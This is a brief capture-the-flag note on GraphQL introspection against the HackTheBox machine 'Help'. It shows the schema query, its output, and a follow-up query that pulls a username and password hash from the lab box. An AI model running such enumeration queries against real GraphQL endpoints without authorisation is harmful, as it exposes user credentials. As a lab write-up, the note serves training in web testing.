## Graphql introspection Example

hackthebox has a box called help. The box has a great example of a graphql enumeration.

The Introspection
```
graphql?query={__schema{types{name,fields{name}}}}
```

Introspection Output
```
{"data":{"__schema":{"types":[{"name":"Query","fields":[{"name":"user"}]},{"name":"User","fields":[{"name":"username"},{"name":"password"}]},{"name":"String","fields":null},
{"name":"__Schema","fields":[{"name":"types"},{"name":"queryType"},{"name":"mutationType"},{"name":"subscriptionType"},{"name":"directives"}]},{"name":"__Type","fields":
[{"name":"kind"},{"name":"name"},{"name":"description"},{"name":"fields"},{"name":"interfaces"},{"name":"possibleTypes"},{"name":"enumValues"},{"name":"inputFields"},
{"name":"ofType"}]},{"name":"__TypeKind","fields":null},{"name":"Boolean","fields":null},{"name":"__Field","fields":[{"name":"name"},{"name":"description"},{"name":"args"},
{"name":"type"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__InputValue","fields":[{"name":"name"},{"name":"description"},{"name":"type"},
{"name":"defaultValue"}]},{"name":"__EnumValue","fields":[{"name":"name"},{"name":"description"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},
{"name":"__Directive","fields":[{"name":"name"},{"name":"description"},{"name":"locations"},{"name":"args"}]},{"name":"__DirectiveLocation","fields":null}]}}}
```

Enumerating data from fields
```
graphql?query={user{username}}
```

Enumerated fields
```
username	"helpme@helpme.com"
password	"5d3c93182bb20f07b994a7f617e99cff"
```
